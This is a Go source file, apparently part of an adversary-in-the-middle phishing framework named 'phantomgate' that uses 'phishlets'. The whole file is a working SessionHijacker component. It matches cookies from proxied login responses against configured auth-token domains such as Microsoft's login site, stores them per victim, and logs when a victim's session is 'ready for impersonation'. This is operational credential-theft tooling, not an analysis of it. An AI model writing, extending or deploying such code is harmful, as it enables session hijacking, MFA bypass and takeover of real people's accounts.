package capture

import (
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// SessionHijacker captures authenticated session cookies from proxy responses
type SessionHijacker struct {
	store    *store.Store
	phishlet *phishlet.Phishlet
	// Track which cookies we've already captured per victim to avoid duplicates
	captured map[string]map[string]bool // victimID → cookie_name → bool
}

// NewSessionHijacker creates a new session hijacker for the given phishlet
func NewSessionHijacker(s *store.Store, p *phishlet.Phishlet) *SessionHijacker {
	return &SessionHijacker{
		store:    s,
		phishlet: p,
		captured: make(map[string]map[string]bool),
	}
}

// InspectResponse checks if the target has set any auth session cookies
// that we should capture for the operator
func (sh *SessionHijacker) InspectResponse(resp *http.Response, victimID string) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	capturedTokens := make(map[string]string)

	for _, authToken := range sh.phishlet.AuthTokens {
		for _, cookie := range cookies {
			// Check if this cookie belongs to one of the auth token domains
			cookieDomain := cookie.Domain
			if cookieDomain == "" {
				// Try to infer domain from response URL
				if resp.Request != nil && resp.Request.URL != nil {
					cookieDomain = resp.Request.URL.Host
				}
			}

			// Match cookie against phishlet auth token config
			if sh.domainMatches(cookieDomain, authToken.Domain) {
				for _, targetKey := range authToken.Keys {
					if strings.EqualFold(cookie.Name, targetKey) && cookie.Value != "" {
						capturedTokens[cookie.Name] = cookie.Value
					}
				}
			}
		}
	}

	if len(capturedTokens) == 0 {
		return
	}

	// Check if we already have these exact cookies for this victim
	if sh.captured[victimID] == nil {
		sh.captured[victimID] = make(map[string]bool)
	}

	newTokens := make(map[string]string)
	for k, v := range capturedTokens {
		if !sh.captured[victimID][k] {
			newTokens[k] = v
			sh.captured[victimID][k] = true
		}
	}

	if len(newTokens) == 0 {
		return // All cookies were already captured
	}

	sess := store.CapturedSession{
		ID:        generateID(),
		VictimID:  victimID,
		Cookies:   capturedTokens,
		Phishlet:  sh.phishlet.Name,
		Timestamp: time.Now(),
		IsValid:   true,
	}

	sh.store.AddSession(sess)

	tokenNames := make([]string, 0, len(newTokens))
	for k := range newTokens {
		tokenNames = append(tokenNames, k)
	}

	log.Printf("[🍪 SESSION CAPTURED] Victim=%s | Tokens=%s | Total=%d",
		victimID, strings.Join(tokenNames, ", "), len(capturedTokens))

	// Check if we have ALL required tokens → full session hijack!
	allKeys := sh.phishlet.GetAllAuthCookieKeys()
	if sh.hasAllTokens(victimID, allKeys) {
		log.Printf("[🎯 FULL SESSION HIJACK] Victim=%s | ALL auth tokens captured! Session is ready for impersonation.", victimID)
	}
}

// hasAllTokens checks if we've captured every required auth token for a victim
func (sh *SessionHijacker) hasAllTokens(victimID string, requiredKeys []string) bool {
	captured, ok := sh.captured[victimID]
	if !ok {
		return false
	}
	for _, key := range requiredKeys {
		if !captured[key] {
			return false
		}
	}
	return true
}

// domainMatches checks if a cookie domain matches the phishlet auth token domain
// Handles wildcard domains (e.g., ".login.microsoftonline.com")
func (sh *SessionHijacker) domainMatches(cookieDomain, tokenDomain string) bool {
	cookieDomain = strings.ToLower(strings.TrimPrefix(cookieDomain, "."))
	tokenDomain = strings.ToLower(strings.TrimPrefix(tokenDomain, "."))

	if cookieDomain == tokenDomain {
		return true
	}

	// Check if the cookie domain is a subdomain of the token domain
	if strings.HasSuffix(cookieDomain, "."+tokenDomain) {
		return true
	}

	// Check if the token domain is a subdomain of the cookie domain
	if strings.HasSuffix(tokenDomain, "."+cookieDomain) {
		return true
	}

	return false
}
